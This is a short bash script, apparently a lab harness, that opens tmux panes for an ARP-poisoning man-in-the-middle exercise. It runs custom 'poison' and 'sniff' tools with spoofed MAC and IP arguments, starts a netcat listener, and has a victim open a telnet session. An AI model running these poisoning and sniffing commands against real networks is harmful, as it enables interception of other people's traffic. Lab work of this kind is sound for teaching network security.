#!/bin/bash

# attacker is top left running poison
tmux new-window "./run_attacker.sh 'sudo /volumes/code/build/bin/poison -s 3e:a6:0b:fe:d8:95 -v 10.10.0.4 -t 10.10.0.5 -a request'"

# attacker running sniff is top right
tmux split-window -h "./run_attacker.sh 'sudo /volumes/code/build/bin/sniff 3e:a6:0b:fe:d8:95'"

# attacker running netcat is bottom left
tmux select-pane -t 0
tmux split-window -v "./run_attacker.sh 'nc -n -l -v 1234'"

# host A is bottom right and runs telnet
tmux select-pane -t 2
tmux split-window -v "./run_hostA.sh 'telnet hostB'"

# Select the first pane
tmux select-pane -t 3
